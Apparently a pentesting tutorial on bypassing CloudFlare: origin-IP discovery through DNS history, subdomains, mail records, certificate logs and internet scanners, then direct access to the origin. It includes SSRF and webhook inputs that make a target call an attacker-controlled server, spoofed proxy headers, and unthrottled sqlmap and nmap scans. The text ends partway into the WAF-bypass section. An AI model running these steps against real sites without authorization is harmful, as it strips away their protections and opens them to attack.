---
title: How to Bypass CloudFlare
description: CloudFlare protection bypass techniques — origin IP discovery, WAF evasion, rate limit circumvention, bot protection bypass, and methods to reach the real server behind CloudFlare during authorized security assessments.
navigation:
  icon: i-lucide-cloud-off
  title: CloudFlare Bypass
---

## Introduction

CloudFlare acts as a **reverse proxy** between users and the origin server, providing DDoS protection, WAF (Web Application Firewall), bot mitigation, and CDN caching. During authorized penetration tests, you often need to **bypass CloudFlare** to test the actual origin server directly — because testing through CloudFlare means you're testing CloudFlare, not the target application.

::note
The goal of CloudFlare bypass in pentesting is to **find the origin server IP** and interact with it directly, or to **evade WAF rules** that block your payloads from reaching the application.
::

```
┌─────────────────────────────────────────────────────────────────┐
│                   HOW CLOUDFLARE WORKS                          │
│                                                                 │
│  ┌──────────┐      ┌──────────────────┐      ┌──────────────┐  │
│  │          │      │                  │      │              │  │
│  │  Client  │─────▶│   CloudFlare     │─────▶│   Origin     │  │
│  │ (You)    │      │   (Proxy)        │      │   Server     │  │
│  │          │◀─────│                  │◀─────│   (Target)   │  │
│  └──────────┘      │  • WAF           │      │              │  │
│                    │  • DDoS Shield    │      │  Real IP:    │  │
│                    │  • Bot Detection  │      │  Hidden      │  │
│                    │  • Rate Limiting  │      │              │  │
│                    │  • CDN/Cache      │      └──────────────┘  │
│                    │  • SSL/TLS        │                        │
│                    └──────────────────┘                        │
│                                                                 │
│  BYPASS GOAL: Find Origin IP → Connect Directly                │
│                                                                 │
│  ┌──────────┐                                ┌──────────────┐  │
│  │          │────────────────────────────────▶│              │  │
│  │  Client  │          DIRECT                │   Origin     │  │
│  │ (You)    │◀───────────────────────────────│   Server     │  │
│  │          │       (No CloudFlare)          │              │  │
│  └──────────┘                                └──────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

::card-group
  ::card
  ---
  title: CloudFlare Documentation
  icon: i-simple-icons-cloudflare
  to: https://developers.cloudflare.com/
  target: _blank
  ---
  Official CloudFlare documentation covering all protection features and configurations.
  ::

  ::card
  ---
  title: HackTricks — CloudFlare Bypass
  icon: i-simple-icons-gitbook
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/uncovering-cloudflare.html
  target: _blank
  ---
  Community-driven bypass techniques for CloudFlare and similar CDN/WAF providers.
  ::

  ::card
  ---
  title: CloudFlare IP Ranges
  icon: i-lucide-globe
  to: https://www.cloudflare.com/ips/
  target: _blank
  ---
  Official list of CloudFlare IP ranges — use to confirm a target is behind CloudFlare.
  ::

  ::card
  ---
  title: SecurityTrails
  icon: i-lucide-search
  to: https://securitytrails.com/
  target: _blank
  ---
  Historical DNS and IP intelligence platform for discovering origin server IPs.
  ::
::

::badge
**Tags: tutorials · cloudflare-bypass · waf-evasion · origin-ip · pentesting · web-security · reconnaissance · bug-bounty**
::

---

## Phase 0 — Confirming CloudFlare Protection

::tip
Before attempting any bypass, **confirm** the target is actually behind CloudFlare. Different CDN/WAF providers require different bypass techniques.
::

### Detection Methods

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```bash [CloudFlare Detection]
# ============================================
# METHOD 1: Check HTTP Response Headers
# ============================================

curl -sI https://target.com | grep -iE 'server|cf-ray|cf-cache|cf-request'

# CloudFlare indicators:
# Server: cloudflare
# CF-RAY: 7f3a2b4c5d6e7f-LAX
# CF-Cache-Status: DYNAMIC
# cf-request-id: ...

# ============================================
# METHOD 2: Check DNS Resolution
# ============================================

# Look up the IP and check if it's in CloudFlare's range
dig +short target.com
# Returns: 104.21.x.x or 172.67.x.x (CloudFlare IPs)

# Check against CloudFlare IP ranges
whois 104.21.x.x | grep -i cloudflare

# ============================================
# METHOD 3: Check SSL Certificate
# ============================================

# CloudFlare uses its own SSL certificates
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -issuer -subject
# Issuer: Cloudflare Inc ECC CA-3
# Or: Subject: sni.cloudflaressl.com

# ============================================
# METHOD 4: Use Online Tools
# ============================================

# Check if behind CDN
curl -s "https://dns.google/resolve?name=target.com&type=A" | python3 -m json.tool

# Nmap CloudFlare detection
nmap -sV --script=http-server-header target.com

# ============================================
# METHOD 5: Check CloudFlare IP Range Directly
# ============================================

# Download CloudFlare IP ranges
curl -s https://www.cloudflare.com/ips-v4 > cf_ips.txt
curl -s https://www.cloudflare.com/ips-v6 >> cf_ips.txt

# Check if target IP is in CloudFlare range
TARGET_IP=$(dig +short target.com | head -1)
echo "Target IP: $TARGET_IP"

# Python check
python3 -c "
import ipaddress
target = ipaddress.ip_address('$TARGET_IP')
cf_ranges = [
    '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
    '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
    '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
    '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
    '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
]
for r in cf_ranges:
    if target in ipaddress.ip_network(r):
        print(f'[✓] {target} is in CloudFlare range {r}')
        break
else:
    print(f'[✗] {target} is NOT in CloudFlare range')
"
```

#code
```bash
# Quick CloudFlare detection
curl -sI https://target.com | grep -i "cf-ray\|cloudflare"
dig +short target.com | head -1
```
::

### CloudFlare Protection Levels

| Feature | Free Plan | Pro Plan | Business | Enterprise |
| --- | --- | --- | --- | --- |
| DNS Proxy | `✓` | `✓` | `✓` | `✓` |
| SSL/TLS | `✓` | `✓` | `✓` | `✓` |
| Basic WAF | `✗` | `✓` | `✓` | `✓` |
| OWASP Ruleset | `✗` | `✗` | `✓` | `✓` |
| Custom WAF Rules | `Limited` | `✓` | `✓` | `✓` |
| Rate Limiting | `Basic` | `✓` | `✓` | `✓` |
| Bot Management | `Basic` | `✓` | `✓` | `Advanced` |
| DDoS L7 | `✓` | `✓` | `✓` | `✓` |
| Under Attack Mode | `✓` | `✓` | `✓` | `✓` |

---

## Phase 1 — Finding the Origin IP

::warning
Finding the origin IP is the **most impactful** CloudFlare bypass. Once you have the real server IP, you can interact with the application directly — bypassing all CloudFlare protections simultaneously.
::

### The Thinking Behind Origin Discovery

::steps{level="4"}

#### Why Origin IPs Leak

CloudFlare only protects traffic that flows through its proxy. The origin IP can leak through:

- **Historical DNS records** — before CloudFlare was configured
- **Subdomains** — not all subdomains are proxied through CloudFlare
- **Email headers** — mail servers often reveal the real IP
- **Direct IP services** — FTP, SSH, non-HTTP services
- **SSL certificates** — certificate transparency logs
- **Outbound connections** — the server connecting back to you
- **Shodan/Censys** — indexed HTTP responses matching the target

#### The Methodology

```
┌──────────────────────────────────────────────────┐
│          ORIGIN IP DISCOVERY METHODOLOGY          │
│                                                  │
│  1. DNS History     ──▶  Check old A records     │
│  2. Subdomains      ──▶  Find non-proxied subs   │
│  3. Email Headers   ──▶  Extract Received: IPs   │
│  4. SSL/TLS Certs   ──▶  CT Logs + Cert search   │
│  5. Internet Scans  ──▶  Shodan/Censys/ZoomEye   │
│  6. Outbound Hooks  ──▶  Force server callback   │
│  7. Virtual Hosts   ──▶  Scan matching vhosts     │
│  8. Information Leak ──▶  Error pages, headers    │
│  9. Cloud Metadata  ──▶  Same cloud provider     │
│ 10. Social/OSINT    ──▶  Old docs, configs        │
└──────────────────────────────────────────────────┘
```

::

### Method 1: DNS History & Records

::caution
DNS history is the **#1 most successful** method for finding origin IPs. Most sites had DNS records pointing to their real IP before moving behind CloudFlare.
::

::tabs
  :::tabs-item{icon="i-lucide-history" label="DNS History Tools"}
  ```bash [DNS History Enumeration]
  # ============================================
  # ONLINE DNS HISTORY TOOLS
  # ============================================
  
  # SecurityTrails — Best for historical DNS
  # https://securitytrails.com/domain/target.com/history/a
  # Shows ALL historical A records with dates
  
  # ViewDNS.info
  # https://viewdns.info/iphistory/?domain=target.com
  
  # CompleteDNS
  # https://completedns.com/dns-history/
  
  # DNSdumpster
  # https://dnsdumpster.com/
  
  # CrimeFlare (specifically for CloudFlare origin discovery)
  # http://www.crimeflare.org:82/cfs.html
  
  # ============================================
  # COMMAND LINE DNS HISTORY
  # ============================================
  
  # SecurityTrails API
  curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
    -H "APIKEY: YOUR_API_KEY" | python3 -m json.tool
  
  # Check multiple DNS history sources
  # CloudFlare bypass databases
  curl -s "http://www.crimeflare.org:82/cfs.html" -d "cfS=target.com"
  
  # ============================================
  # PASSIVE DNS DATABASES
  # ============================================
  
  # VirusTotal passive DNS
  curl -s "https://www.virustotal.com/api/v3/domains/target.com/resolutions" \
    -H "x-apikey: YOUR_VT_KEY" | python3 -c "
  import sys,json
  data = json.load(sys.stdin)
  for r in data.get('data',[]):
      ip = r['attributes']['ip_address']
      date = r['attributes']['date']
      print(f'{date} -> {ip}')
  "
  
  # RiskIQ / PassiveTotal
  # https://community.riskiq.com/
  
  # Farsight DNSDB
  # https://www.farsightsecurity.com/solutions/dnsdb/
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Subdomain Enumeration"}
  ```bash [Subdomain Discovery for Origin IP]
  # ============================================
  # WHY SUBDOMAINS?
  # ============================================
  # Common misconfiguration: main domain is behind CloudFlare
  # but subdomains (mail, ftp, dev, staging) point to origin IP
  
  # ============================================
  # SUBDOMAIN ENUMERATION
  # ============================================
  
  # Subfinder (passive)
  subfinder -d target.com -silent | tee subdomains.txt
  
  # Amass (comprehensive)
  amass enum -passive -d target.com -o subdomains.txt
  
  # Sublist3r
  python3 sublist3r.py -d target.com -o subdomains.txt
  
  # crt.sh (Certificate Transparency)
  curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
    python3 -c "import sys,json; [print(x['name_value']) for x in json.load(sys.stdin)]" | \
    sort -u | tee ct_subdomains.txt
  
  # ============================================
  # RESOLVE AND FILTER NON-CLOUDFLARE IPs
  # ============================================
  
  # Resolve all subdomains
  cat subdomains.txt | while read sub; do
      ip=$(dig +short "$sub" | head -1)
      if [ -n "$ip" ]; then
          echo "$sub -> $ip"
      fi
  done | tee resolved.txt
  
  # Filter out CloudFlare IPs (keep only non-CF IPs)
  python3 << 'PYEOF'
  import ipaddress
  
  cf_ranges = [
      '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
      '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
      '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
      '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
      '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
  ]
  cf_nets = [ipaddress.ip_network(r) for r in cf_ranges]
  
  with open('resolved.txt') as f:
      for line in f:
          parts = line.strip().split(' -> ')
          if len(parts) == 2:
              sub, ip = parts
              try:
                  addr = ipaddress.ip_address(ip)
                  is_cf = any(addr in net for net in cf_nets)
                  if not is_cf:
                      print(f"[ORIGIN?] {sub} -> {ip}")
                  else:
                      print(f"[CF]      {sub} -> {ip}")
              except:
                  pass
  PYEOF
  
  # ============================================
  # COMMON SUBDOMAINS THAT LEAK ORIGIN IP
  # ============================================
  # mail.target.com          → MX record often points to origin
  # ftp.target.com           → FTP server on origin
  # direct.target.com        → Direct access
  # origin.target.com        → Explicitly named
  # dev.target.com           → Development server
  # staging.target.com       → Staging environment
  # api.target.com           → API endpoint
  # admin.target.com         → Admin panel
  # cpanel.target.com        → cPanel
  # webmail.target.com       → Webmail interface
  # smtp.target.com          → SMTP server
  # vpn.target.com           → VPN endpoint
  # ns1.target.com           → Nameserver
  # old.target.com           → Old version
  # test.target.com          → Test environment
  # internal.target.com      → Internal services
  
  # Quick check common subdomains
  for sub in mail ftp direct origin dev staging api admin cpanel webmail smtp vpn old test internal panel; do
      ip=$(dig +short "${sub}.target.com" 2>/dev/null | head -1)
      [ -n "$ip" ] && echo "${sub}.target.com -> $ip"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-mail" label="MX & Email Records"}
  ```bash [Email-Based Origin Discovery]
  # ============================================
  # MX RECORDS (Mail Exchange)
  # ============================================
  # Mail servers often run on the SAME server as the web app
  # MX records are NOT proxied through CloudFlare
  
  # Check MX records
  dig MX target.com +short
  # Example output: 10 mail.target.com.
  
  # Resolve MX hostname
  dig +short mail.target.com
  # This often returns the ORIGIN IP!
  
  # ============================================
  # SPF RECORDS (Sender Policy Framework)
  # ============================================
  # SPF records list authorized sending IPs — often the origin
  
  dig TXT target.com +short | grep spf
  # Example: "v=spf1 ip4:203.0.113.50 include:_spf.google.com ~all"
  #                      ^^^^^^^^^^^^^^
  #                      ORIGIN IP!
  
  # ============================================
  # EMAIL HEADER ANALYSIS
  # ============================================
  # Trigger the application to send YOU an email:
  # - Password reset
  # - Registration confirmation  
  # - Contact form
  # - Newsletter signup
  # - Error notifications
  
  # Then examine the email headers:
  # Received: from mail.target.com (203.0.113.50)
  #           by mx.gmail.com with ESMTP
  #                              ^^^^^^^^^^^^^^
  #                              ORIGIN IP!
  
  # Look for these headers:
  # Received:
  # X-Originating-IP:
  # Return-Path:
  # X-Mailer-IP:
  # X-Source-IP:
  
  # ============================================
  # AUTOMATED EMAIL HEADER EXTRACTION
  # ============================================
  
  # If you have the raw email source:
  grep -iE "Received:|X-Originating-IP:|Return-Path:|from.*\(" email_headers.txt | \
    grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u
  ```
  :::
::

### Method 2: SSL/TLS Certificate Analysis

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```bash [SSL Certificate Origin Discovery]
# ============================================
# CERTIFICATE TRANSPARENCY (CT) LOGS
# ============================================

# Search crt.sh for all certificates issued to target
curl -s "https://crt.sh/?q=target.com&output=json" | \
  python3 -c "
import sys, json
certs = json.load(sys.stdin)
seen = set()
for cert in certs:
    names = cert.get('name_value','').split('\n')
    for name in names:
        if name not in seen:
            seen.add(name)
            print(name)
" | sort -u

# ============================================
# CENSYS CERTIFICATE SEARCH
# ============================================

# Search for certificates matching target domain
# https://search.censys.io/certificates?q=target.com

# Censys API
curl -s "https://search.censys.io/api/v2/certificates/search" \
  -H "Accept: application/json" \
  -u "API_ID:API_SECRET" \
  -d '{"q":"target.com","per_page":100}' | python3 -m json.tool

# ============================================
# MATCH CERTIFICATE ON ORIGIN SERVER
# ============================================

# If you have a candidate origin IP, check if the SSL cert matches
echo | openssl s_client -connect CANDIDATE_IP:443 -servername target.com 2>/dev/null | \
  openssl x509 -noout -subject -issuer -dates

# Compare with CloudFlare certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -fingerprint -sha256

# ============================================
# SCAN FOR CERTIFICATE MATCHES (Censys)
# ============================================

# Find all IPs serving the same certificate as target.com
# 1. Get the SHA256 fingerprint of the target's origin cert
# 2. Search Censys for that fingerprint
# 3. Results show the origin IP

# Get cert fingerprint through CloudFlare
CERT_FP=$(echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -fingerprint -sha256 | cut -d= -f2)
echo "Certificate fingerprint: $CERT_FP"

# Search Censys for this fingerprint
# https://search.censys.io/search?resource=hosts&q=services.tls.certificates.leaf.fingerprint_sha256:FINGERPRINT
```

#code
```bash
# Quick cert-based origin discovery
curl -s "https://crt.sh/?q=%25.target.com&output=json" | python3 -c "import sys,json;[print(x['name_value']) for x in json.load(sys.stdin)]" | sort -u
```
::

### Method 3: Internet-Wide Scan Data

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Shodan"}
  ```bash [Shodan Origin Discovery]
  # ============================================
  # SHODAN — Search for Origin Server
  # ============================================
  
  # Search by SSL certificate organization
  # https://www.shodan.io/search?query=ssl.cert.subject.cn:target.com
  
  # Search by HTTP title
  # https://www.shodan.io/search?query=http.title:"Target Company" -org:"Cloudflare"
  
  # Search by favicon hash
  # https://www.shodan.io/search?query=http.favicon.hash:HASH
  
  # ============================================
  # SHODAN CLI
  # ============================================
  
  # Install Shodan CLI
  pip3 install shodan
  shodan init YOUR_API_KEY
  
  # Search by SSL cert
  shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port,org
  
  # Search by HTTP title (exclude CloudFlare)
  shodan search 'http.title:"Target Company" -org:"Cloudflare"' --fields ip_str,port,org
  
  # Search by HTTP body content (unique string from target site)
  shodan search 'http.html:"Unique String From Target"' --fields ip_str,port,org
  
  # Search by favicon hash
  # First, calculate the favicon hash:
  python3 << 'PYEOF'
  import mmh3
  import requests
  import codecs
  
  response = requests.get('https://target.com/favicon.ico')
  favicon_hash = mmh3.hash(codecs.lookup('base64').encode(response.content)[0])
  print(f"Favicon hash: {favicon_hash}")
  print(f"Shodan dork: http.favicon.hash:{favicon_hash}")
  PYEOF
  
  # Then search Shodan
  shodan search "http.favicon.hash:HASH_VALUE -org:Cloudflare" --fields ip_str,port,org
  
  # ============================================
  # FILTER RESULTS
  # ============================================
  
  # Exclude CDN/WAF providers
  shodan search 'ssl.cert.subject.cn:target.com -org:"Cloudflare" -org:"Akamai" -org:"Fastly" -org:"Amazon CloudFront"' --fields ip_str,port,org
  ```
  :::

  :::tabs-item{icon="i-lucide-scan" label="Censys"}
  ```bash [Censys Origin Discovery]
  # ============================================
  # CENSYS — Certificate & Host Search
  # ============================================
  
  # Web Interface
  # https://search.censys.io/search?resource=hosts&q=services.http.response.html_title%3A%22Target+Company%22
  
  # ============================================
  # CENSYS CLI / API
  # ============================================
  
  pip3 install censys
  censys config  # Enter API ID and Secret
  
  # Search by certificate
  censys search "services.tls.certificates.leaf.names:target.com" --index-type hosts
  
  # Search by HTTP title
  censys search 'services.http.response.html_title:"Target Company"' --index-type hosts
  
  # Search by HTTP body hash
  censys search 'services.http.response.body_hash:"sha256:HASH"' --index-type hosts
  
  # ============================================
  # CENSYS PYTHON SCRIPT — Find Origin
  # ============================================
  
  python3 << 'PYEOF'
  from censys.search import CensysHosts
  import ipaddress
  
  # CloudFlare ranges
  cf_ranges = [
      '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
      '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
      '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
      '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
      '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
  ]
  cf_nets = [ipaddress.ip_network(r) for r in cf_ranges]
  
  h = CensysHosts()
  query = 'services.tls.certificates.leaf.names:target.com'
  
  for page in h.search(query, per_page=100, pages=5):
      for host in page:
          ip = host['ip']
          try:
              addr = ipaddress.ip_address(ip)
              is_cf = any(addr in net for net in cf_nets)
              if not is_cf:
                  print(f"[POTENTIAL ORIGIN] {ip}")
                  for svc in host.get('services', []):
                      print(f"  Port: {svc.get('port')} - {svc.get('service_name')}")
          except:
              pass
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="Other Scanners"}
  ```bash [Alternative Search Engines]
  # ============================================
  # ZOOMEYE
  # ============================================
  # https://www.zoomeye.org/
  # Search: site:target.com
  # Search: ssl:"target.com" -"cloudflare"
  
  # ============================================
  # FOFA
  # ============================================
  # https://en.fofa.info/
  # Search: cert="target.com" && !ip="104.16.0.0/12"
  # Search: title="Target Company" && !header="cloudflare"
  
  # ============================================
  # HUNTER.IO
  # ============================================
  # https://hunter.how/
  # Search: tls.cert.subject_cn="target.com"
  
  # ============================================
  # NETLAS
  # ============================================
  # https://netlas.io/
  # Search: certificate.subject.common_name:target.com
  
  # ============================================
  # BINARY EDGE
  # ============================================
  # https://app.binaryedge.io/
  # Search: web.domain:target.com
  
  # ============================================
  # ALL-IN-ONE SCRIPT
  # ============================================
  
  # CloudFlair — Automated origin discovery using Censys
  # https://github.com/christophetd/CloudFlair
  pip3 install cloudflair
  export CENSYS_API_ID=your_id
  export CENSYS_API_SECRET=your_secret
  cloudflair target.com
  ```
  :::
::

### Method 4: Outbound Connection Tricks

::note
If the application makes **outbound connections** (webhooks, SSRF, URL fetching, image loading), you can force the origin server to connect to YOUR server — revealing its real IP.
::

```bash [Outbound Connection Origin Discovery]
# ============================================
# THE CONCEPT
# ============================================
# Make the TARGET connect to YOUR controlled server
# Your server logs the incoming IP → that's the origin IP
# CloudFlare only proxies INBOUND connections, not outbound

# ============================================
# STEP 1: Set Up a Listener
# ============================================

# Simple HTTP listener
python3 -m http.server 8888
# Or
nc -lvnp 8888

# Use Burp Collaborator, interactsh, or webhook.site
# https://webhook.site  ← Easy, free, no setup

# Interactsh (self-hosted)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client

# ============================================
# STEP 2: Trigger Outbound Connection
# ============================================

# --- Via Application Features ---

# Profile picture / Avatar upload (URL fetch)
# Enter: http://YOUR_SERVER:8888/avatar.png

# Webhook configuration
# Set webhook URL to: http://YOUR_SERVER:8888/webhook

# URL preview / Link unfurling
# Post a link: http://YOUR_SERVER:8888/page

# Import from URL feature
# Import URL: http://YOUR_SERVER:8888/data.csv

# RSS feed reader
# Feed URL: http://YOUR_SERVER:8888/feed.xml

# PDF generation from URL
# URL: http://YOUR_SERVER:8888/page

# --- Via Email ---

# Send email with tracking pixel
# <img src="http://YOUR_SERVER:8888/pixel.png" width="1" height="1">
# When the mail server fetches the image → origin IP revealed

# --- Via SSRF (if vulnerable) ---

# http://target.com/fetch?url=http://YOUR_SERVER:8888/
# The server-side request reveals the origin IP

# ============================================
# STEP 3: Check Your Listener
# ============================================

# The incoming connection IP is the ORIGIN SERVER IP
# Example log:
# 203.0.113.50 - - [01/Jan/2024 12:00:00] "GET /avatar.png HTTP/1.1" 200 -
# ^^^^^^^^^^^^^^^^^^
# This is the origin IP!
```

### Method 5: Specialized Origin Discovery Tools

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```bash [Automated Origin Discovery Tools]
# ============================================
# CloudFlair (Censys-based)
# ============================================
pip3 install cloudflair
export CENSYS_API_ID=your_id
export CENSYS_API_SECRET=your_secret
cloudflair target.com

# ============================================
# CloudUnflare
# ============================================
git clone https://github.com/greycatz/CloudUnflare.git
cd CloudUnflare
bash cloudunflare.bash

# ============================================
# CloakQuest3r
# ============================================
git clone https://github.com/spyboy-productions/CloakQuest3r.git
cd CloakQuest3r
pip3 install -r requirements.txt
python3 cloakquest3r.py target.com

# ============================================
# Bypass-firewalls-by-DNS-history
# ============================================
git clone https://github.com/vincentcox/bypass-firewalls-by-DNS-history.git
cd bypass-firewalls-by-DNS-history
bash bypass-firewalls-by-DNS-history.sh -d target.com

# ============================================
# CloudBrute
# ============================================
# Finds origin by brute-forcing cloud provider IP ranges
git clone https://github.com/0xsha/CloudBrute.git
cd CloudBrute
go build -o cloudbrute
./cloudbrute -d target.com -k target_keyword -w providers.txt

# ============================================
# Cf-check (bulk CloudFlare check)
# ============================================
git clone https://github.com/dwisiswant0/cf-check.git
cd cf-check
go build
echo "target.com" | ./cf-check

# ============================================
# ONLINE TOOLS (No Setup Required)
# ============================================
# https://www.crimeflare.org:82/cfs.html     — CrimeFlare database
# https://securitytrails.com/                  — DNS history
# https://viewdns.info/iphistory/              — IP history
# https://completedns.com/dns-history/         — DNS history
# https://dnsdumpster.com/                     — DNS recon
# https://builtwith.com/                       — Technology profiler
# https://web.archive.org/                     — Wayback Machine (old IPs in content)
```

#code
```bash
# Quick automated origin discovery
cloudflair target.com
# Or
python3 cloakquest3r.py target.com
```
::

---

## Phase 2 — Validating the Origin IP

::caution
Finding a candidate IP is not enough — you must **validate** that it's actually the origin server serving the same content as the CloudFlare-proxied domain.
::

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```bash [Origin IP Validation]
# ============================================
# METHOD 1: Direct HTTP Request with Host Header
# ============================================

# The origin server should respond to the target's hostname
curl -sk -H "Host: target.com" https://CANDIDATE_IP/ | head -50

# Compare with CloudFlare response
curl -sk https://target.com/ | head -50

# If content matches → confirmed origin IP!

# ============================================
# METHOD 2: Compare Response Headers
# ============================================

echo "=== Via CloudFlare ===" 
curl -sI https://target.com/

echo ""
echo "=== Direct to Origin ==="
curl -sI -H "Host: target.com" https://CANDIDATE_IP/ --resolve target.com:443:CANDIDATE_IP

# Origin should NOT have CloudFlare headers (CF-RAY, Server: cloudflare)

# ============================================
# METHOD 3: Compare Content Hash
# ============================================

# Hash content from CloudFlare
CF_HASH=$(curl -sk https://target.com/ | md5sum | cut -d' ' -f1)

# Hash content from candidate origin
ORIGIN_HASH=$(curl -sk -H "Host: target.com" https://CANDIDATE_IP/ | md5sum | cut -d' ' -f1)

echo "CloudFlare hash: $CF_HASH"
echo "Origin hash:     $ORIGIN_HASH"

if [ "$CF_HASH" = "$ORIGIN_HASH" ]; then
    echo "[✓] MATCH — Confirmed origin IP: $CANDIDATE_IP"
else
    echo "[?] Content differs — may still be origin (dynamic content)"
    echo "    Check manually for visual similarity"
fi

# ============================================
# METHOD 4: SSL Certificate Check
# ============================================

# Check if origin has the site's real certificate (not CloudFlare's)
echo | openssl s_client -connect CANDIDATE_IP:443 -servername target.com 2>/dev/null | \
  openssl x509 -noout -subject -issuer

# If issuer is NOT "Cloudflare Inc" → likely the origin cert

# ============================================
# METHOD 5: Nmap Service Scan
# ============================================

nmap -sV -p 80,443,8080,8443 CANDIDATE_IP

# ============================================
# METHOD 6: Full Validation Script
# ============================================

python3 << 'PYEOF'
import requests
import hashlib
import ssl
import socket
import warnings
warnings.filterwarnings('ignore')

domain = "target.com"
candidate_ip = "CANDIDATE_IP"

print(f"Validating {candidate_ip} as origin for {domain}")
print("=" * 50)

# Test 1: HTTP response
try:
    r1 = requests.get(f"https://{domain}/", verify=False, timeout=10)
    r2 = requests.get(f"https://{candidate_ip}/", 
                      headers={"Host": domain}, 
                      verify=False, timeout=10)
    
    # Compare status codes
    print(f"\n[Status Code]")
    print(f"  CloudFlare: {r1.status_code}")
    print(f"  Origin:     {r2.status_code}")
    
    # Compare content length
    print(f"\n[Content Length]")
    print(f"  CloudFlare: {len(r1.text)}")
    print(f"  Origin:     {len(r2.text)}")
    
    # Compare content hash
    h1 = hashlib.md5(r1.text.encode()).hexdigest()
    h2 = hashlib.md5(r2.text.encode()).hexdigest()
    print(f"\n[Content Hash]")
    print(f"  CloudFlare: {h1}")
    print(f"  Origin:     {h2}")
    print(f"  Match: {'YES ✓' if h1 == h2 else 'NO (may be dynamic content)'}")
    
    # Check for CloudFlare headers on origin
    cf_headers = ['cf-ray', 'cf-cache-status', 'cf-request-id']
    has_cf = any(h in r2.headers for h in cf_headers)
    print(f"\n[CloudFlare Headers on Origin]")
    print(f"  {'PRESENT (still behind CF?)' if has_cf else 'ABSENT ✓ (direct access confirmed)'}")
    
    # Server header
    print(f"\n[Server Header]")
    print(f"  CloudFlare: {r1.headers.get('server', 'N/A')}")
    print(f"  Origin:     {r2.headers.get('server', 'N/A')}")
    
except Exception as e:
    print(f"Error: {e}")

print("\n" + "=" * 50)
PYEOF
```

#code
```bash
# Quick validation
curl -sk -H "Host: target.com" https://CANDIDATE_IP/ | head -20
```
::

---

## Phase 3 — Directly Accessing the Origin

### Configuring Direct Access

::steps{level="4"}

#### Step 1: Modify /etc/hosts (or use curl --resolve)

```bash [Direct Origin Access Methods]
# ============================================
# METHOD 1: /etc/hosts modification
# ============================================

# Add entry to force DNS resolution to origin IP
echo "203.0.113.50 target.com www.target.com" | sudo tee -a /etc/hosts

# Now all tools will connect directly to origin
curl https://target.com/               # Goes to origin
firefox https://target.com             # Goes to origin
sqlmap -u "https://target.com/?id=1"   # Tests origin directly

# REMEMBER to remove when done!
sudo sed -i '/target.com/d' /etc/hosts

# ============================================
# METHOD 2: curl --resolve (per-request, no system changes)
# ============================================

curl -sk --resolve "target.com:443:203.0.113.50" https://target.com/

# Multiple requests
curl -sk --resolve "target.com:443:203.0.113.50" \
  --resolve "target.com:80:203.0.113.50" \
  https://target.com/login

# ============================================
# METHOD 3: Burp Suite Configuration
# ============================================

# In Burp Suite:
# Project Options → Connections → Hostname Resolution Overrides
# Add: target.com → 203.0.113.50

# Or use upstream proxy settings
# Target → Scope → Add target.com
# Project Options → Connections → Upstream Proxy → target.com:443 → 203.0.113.50:443
```

#### Step 2: Test Application Directly

```bash [Testing Origin Without CloudFlare]
# Full vulnerability scan against origin
nikto -h https://target.com/ -nossl  # Via /etc/hosts

# Directory brute-force (no rate limiting from CF)
gobuster dir -u https://target.com/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k

# SQL injection testing (no WAF blocking)
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3

# Nmap full scan of origin
nmap -sV -sC -p- 203.0.113.50

# Discover additional services on origin
nmap -sV -p 1-65535 203.0.113.50
```

#### Step 3: Check if Origin Accepts Direct Connections

```bash [Origin Access Control Check]
# Does the origin restrict by source IP?
curl -sk -H "Host: target.com" https://203.0.113.50/

# Possible responses:
# 200 OK           → Origin is OPEN (no IP restriction) ← Most common!
# 403 Forbidden    → Origin checks source IP (good security)
# Connection reset → Origin firewall blocks non-CF IPs
# Empty response   → Origin only accepts CF IPs

# If origin blocks non-CF IPs, try CloudFlare IP spoofing:
# (This is very unlikely to work but worth testing)
curl -sk -H "Host: target.com" \
  -H "CF-Connecting-IP: 1.2.3.4" \
  -H "X-Forwarded-For: 1.2.3.4" \
  https://203.0.113.50/
```

::

---

## Phase 4 — WAF Bypass Techniques

::warning
Even without finding the origin IP, you can attempt to **bypass CloudFlare's WAF rules** to get malicious payloads through to the application. This tests the WAF configuration, not CloudFlare itself.
::

### Understanding CloudFlare WAF Layers

```
┌─────────────────────────────────────────────────┐
│          CLOUDFLARE WAF RULE LAYERS              │
│                                                 │
│  ┌───────────────────────────────────────────┐  │
│  │ Layer 1: IP Reputation & Rate Limiting    │  │
│  │  → IP blocklists, country blocks          │  │
│  │  → Rate limiting rules                    │  │
│  └───────────────────────────────────────────┘  │
